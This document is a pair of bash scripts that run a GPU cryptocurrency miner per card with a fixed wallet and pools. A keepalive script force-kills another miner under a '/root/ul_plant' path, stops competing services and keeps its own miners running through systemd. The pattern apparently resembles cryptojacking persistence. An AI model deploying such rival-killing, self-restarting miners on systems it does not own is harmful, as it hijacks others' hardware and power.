-- plh-card.sh
#!/bin/bash
N="$1"
LOG=/var/log/plh-g$N.log
exec >>"$LOG" 2>&1
echo "=== start $(date -u +%FT%TZ) card=$N pid=$$"
while true; do
  /opt/arsenal/miners/krig/krig-miner --coin pearl \
    --url stratum+ssl://prl-sg.kryptex.network:8048 \
    --url stratum+tcp://pool.pearlhash.xyz:9000 \
    --url stratum+ssl://pearl-sg1.luckypool.io:3360 \
    --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g$N \
    --password x -d $N --api-port $((1300+N))
  echo "=== miner exit rc=$? $(date -u +%FT%TZ)"
  sleep 15
done
-- keepalive
#!/bin/bash
W=prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l
pkill -9 -f '/root/ul_plant/krig/' 2>/dev/null
for i in 0 1 2 3 4 5 6 7; do systemctl is-active -q ul-card@$i && systemctl stop ul-card@$i 2>/dev/null; done
for n in 0 1 2 3 4 5 6 7; do
  systemctl is-enabled -q plh-card@$n || systemctl enable plh-card@$n >/dev/null 2>&1
  if ! pgrep -f -- "--user $W/plh-123-184-7-135-g$n " >/dev/null 2>&1; then
    systemctl restart plh-card@$n >/dev/null 2>&1
  fi
done
# exactly one per card guard: if >1 for a card, leave the oldest
for n in 0 1 2 3 4 5 6 7; do
  c=$(pgrep -fc -- "--user $W/plh-123-184-7-135-g$n " 2>/dev/null)
  if [ "${c:-0}" -gt 1 ]; then pkill -9 -f -- "--user $W/plh-123-184-7-135-g$n " 2>/dev/null; systemctl restart plh-card@$n >/dev/null 2>&1; fi
done
exit 0
